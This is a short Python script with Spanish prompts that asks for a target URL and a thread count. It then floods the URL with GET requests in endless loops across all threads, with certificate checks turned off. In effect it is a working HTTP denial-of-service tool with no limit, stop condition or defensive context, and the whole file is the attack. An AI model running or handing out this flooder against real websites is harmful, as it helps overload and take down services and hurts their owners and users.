import threading
import requests

def print_banner():
    print("===================================")
    print("             Sin nombre             ")
    print("===================================")

def get_user_input():
    url = input("Ingrese la URL: ")
    num_threads = int(input("Ingrese el número de hilos: "))
    return url, num_threads

def send_request(url):
    while True:
        try:
            response = requests.get(url, verify=False)
            print(f"Request sent with status code: {response.status_code}")
        except Exception as e:
            print(e)

def main():
    print_banner()
    url, num_threads = get_user_input()
    threads = []

    for i in range(num_threads):
        t = threading.Thread(target=send_request, args=(url,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
